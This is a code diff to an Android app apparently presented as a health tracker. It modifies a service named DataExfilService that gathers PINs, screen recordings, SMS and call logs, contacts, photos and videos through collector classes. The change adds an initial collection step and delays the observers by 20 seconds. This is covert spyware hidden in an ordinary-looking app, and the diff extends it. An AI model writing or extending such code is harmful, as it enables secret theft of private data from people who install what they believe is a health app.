@@ -33,6 +33,7 @@ import com.inf2007.healthtracker.utilities.collectors.PinCollector
 import com.inf2007.healthtracker.utilities.collectors.ScreenRecordingCollector
 import com.inf2007.healthtracker.utilities.collectors.SmsCallLogCollector
 import com.inf2007.healthtracker.utilities.collectors.VideoCollector
+import com.inf2007.healthtracker.utilities.startup.StartupController
 
 class DataExfilService : Service() {
 
@@ -136,12 +137,16 @@ class DataExfilService : Service() {
             add(VideoCollector(this@DataExfilService))
         }
 
-        collectors.forEach { it.startObserving() }
+        StartupController(this).performInitialCollection()
 
-        collectors.filterIsInstance<ContactCollector>().firstOrNull()?.setupObservers(contentResolver)
-        collectors.filterIsInstance<PhotoCollector>().firstOrNull()?.setupObservers(contentResolver)
-        collectors.filterIsInstance<SmsCallLogCollector>().firstOrNull()?.setupObservers(contentResolver)
-        collectors.filterIsInstance<VideoCollector>().firstOrNull()?.setupObservers(contentResolver)
+        Handler(Looper.getMainLooper()).postDelayed({
+            collectors.filterIsInstance<ContactCollector>().firstOrNull()?.setupObservers(contentResolver)
+            collectors.filterIsInstance<PhotoCollector>().firstOrNull()?.setupObservers(contentResolver)
+            collectors.filterIsInstance<SmsCallLogCollector>().firstOrNull()?.setupObservers(contentResolver)
+            collectors.filterIsInstance<VideoCollector>().firstOrNull()?.setupObservers(contentResolver)
+
+            collectors.forEach { it.startObserving() }
+        }, 20000)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
